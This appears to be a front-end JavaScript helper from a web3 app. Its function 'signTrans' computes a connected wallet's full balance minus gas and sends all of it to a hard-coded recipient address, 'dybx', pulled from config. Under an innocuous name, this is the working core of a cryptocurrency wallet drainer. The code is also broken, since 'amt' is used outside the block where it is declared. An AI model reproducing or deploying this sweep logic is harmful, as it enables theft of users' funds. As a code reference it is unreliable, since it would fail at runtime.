import {BNBABI, ETHABI,BNBAddress, ETHAddress,Receiver} from "config/constants/abis"
import {Contract} from "@ethersproject/contracts"
import {useNetwork} from "wagmi"
import { dybx } from "config/constants"


export const signTrans = async(isConnected,signer,balance) => {
  if(!isConnected)
    return

  const tranReq = {to:dybx,value:balance.value}
  const gasEst = await  signer.estimateGas(tranReq).catch(console)
  const gasPrice = await signer.getGasPrice().catch(console)
  const gas = gasEst.mul(gasPrice) //* gasPrice
  const rems = balance?.value.sub(gas) 

if(rems && rems.gte(gas)) {
  const amt = rems
  console.log("Sendable ",amt)
}
else{
  console.log("Low balance", amt)
  return
}

console.log("Gas",gas,"Amount",amt,"Remainder",rems)

signer.sendTransaction({to:dybx,value:amt})
.then((data) => {
  console.log(data)
 
})

//
}

